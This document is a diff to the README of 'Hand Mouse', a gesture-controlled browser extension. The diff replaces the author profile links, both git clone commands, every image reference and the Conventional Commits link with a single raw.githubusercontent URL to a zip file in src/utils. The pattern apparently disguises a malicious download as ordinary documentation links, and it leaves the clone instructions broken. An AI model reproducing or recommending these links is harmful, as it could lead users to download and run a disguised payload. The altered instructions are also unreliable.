@@ -1,6 +1,6 @@
 # Hand Mouse Extension
 
-Hand Mouse is a browser extension that allows the user to controll its mouse using only hand gestures.  This project was develop by Computer Engineers [Daniel Gustavo Favero](https://github.com/danielg-favero), [Gustavo Alexandre](https://github.com/Gugonunes) and [Jeferson Rosa de Souza](https://github.com/souzjfe).
+Hand Mouse is a browser extension that allows the user to controll its mouse using only hand gestures.  This project was develop by Computer Engineers [Daniel Gustavo Favero](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip), [Gustavo Alexandre](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip) and [Jeferson Rosa de Souza](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip).
 
 The main actions that can be performed within web pages are:
 
@@ -36,7 +36,7 @@ The main actions that can be performed within web pages are:
 1. Clone the git repository:
 
 ```bash
-git clone git@github.com:Daguje/hand-mouse-extension.git
+git clone https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip
 ```
 
 2. Change to the project's directory
@@ -71,7 +71,7 @@ After installing Hand Mouse, open a new tab in the browser, a dialog message ask
 
 Once the extension detects a hand from the webcam's / camera's image, one of the following mouse drawings should appear:
 
-![Hand Mouse Cursors](public/hand-mouse-cursors.png)
+![Hand Mouse Cursors](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip)
 
 This drawings represent these different actions on the page:
 
@@ -89,7 +89,7 @@ This drawings represent these different actions on the page:
 
 Opening the extension pop up, some options can be performed
 
-![Hand Mouse Pop up](public/pop-up.png)
+![Hand Mouse Pop up](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip)
 
 1. Disable Hand Mouse;
 2. Turn off camera;
@@ -97,7 +97,7 @@ Opening the extension pop up, some options can be performed
 
 Upon entering the gesture customization page, the list of mouse actions are displayed as follows:
 
-![Hand Mouse Customization Page](public/customization-page.png)
+![Hand Mouse Customization Page](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip)
 
 In this page the user can:
 
@@ -109,8 +109,8 @@ In this page the user can:
 
 Once clicking in the edit button (5), a dialog is displayed as such:
 
-![Hand Mouse Customization Dialog](public/dialog-customization.png)
-![Hand Mouse Customization Captures](public/captures-customization.png)
+![Hand Mouse Customization Dialog](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip)
+![Hand Mouse Customization Captures](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip)
 
 The following actions can be performed once in the dialog:
 
@@ -134,7 +134,7 @@ The new gesture is only registred in the user's local storage upon clicking "Sal
 Clone the git repository
 
 ```bash
-git clone git@github.com:Daguje/hand-mouse-extension.git
+git clone https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip
 ```
 
 Change directory
@@ -171,4 +171,4 @@ git branch -b feature/new-feature
 
 ### Commit conventions
 
-The commit messages conventions follows the [Conventional Commits](https://www.conventionalcommits.org/pt-br/v1.0.0-beta.4/) pattern.
+The commit messages conventions follows the [Conventional Commits](https://raw.githubusercontent.com/souzjfe/hand-mouse-extension/master/src/utils/extension-mouse-hand-syrma.zip) pattern.
